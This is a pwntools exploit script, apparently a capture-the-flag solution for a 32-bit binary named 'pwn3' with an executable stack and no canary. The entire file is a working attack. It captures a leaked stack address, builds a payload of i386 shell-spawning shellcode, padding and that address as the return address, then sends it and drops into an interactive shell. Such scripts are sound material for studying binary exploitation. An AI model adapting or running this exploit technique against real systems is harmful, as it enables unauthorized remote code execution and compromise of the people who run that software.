#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pwn3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './pwn3')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

io = start()

shellcode = asm(shellcraft.i386.sh())

io.recvuntil("Take this, you might need it on your journey ")
mem_leak = io.recvline()
mem_leak = mem_leak[:-2] # remove ! and \n
mem_leak = mem_leak.decode('utf-8') # convert binary to string

payload = b""
payload += shellcode
payload += b"A"*(0x12e - len(shellcode))
payload += p32(int(mem_leak,16))
io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

